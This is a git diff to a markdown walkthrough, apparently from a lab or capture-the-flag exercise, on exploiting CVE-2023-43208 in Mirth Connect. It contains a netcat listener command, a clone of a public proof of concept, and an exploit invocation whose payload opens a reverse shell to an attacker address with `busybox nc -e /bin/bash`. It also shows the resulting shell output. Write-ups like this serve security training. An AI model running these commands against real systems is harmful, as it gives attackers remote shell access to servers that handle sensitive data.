@@ -30,19 +30,31 @@ This can be found here: https://github.com/jakabakos/CVE-2023-43208-mirth-connec
 
 Preparing and executing the payload provides us with a shell on the server.
 
-### Start a listener:
+#### Start a listener:
 
 ```
 nc -lvnp 4444
 ```
 
-### Download and execute the exploit:
+#### Download the exploit:
 
 ```
 git clone https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc
-cd CVE-2023-43208-mirth-connect-rce-poc
+```
+
+#### Execute the exploit:
+```
 python3 CVE-2023-43208.py -u https://10.129.89.231/ -c 'busybox nc 10.10.14.16 4444 -e /bin/bash'
 ```
+
+#### Output:
+```
+Listening on 0.0.0.0 4444
+Connection received on 10.129.89.231 57956
+id
+uid=103(mirth) gid=111(mirth) groups=111(mirth)
+```
+
 
 <img src="Images/06-Payload-Prep.png" width="600">
 
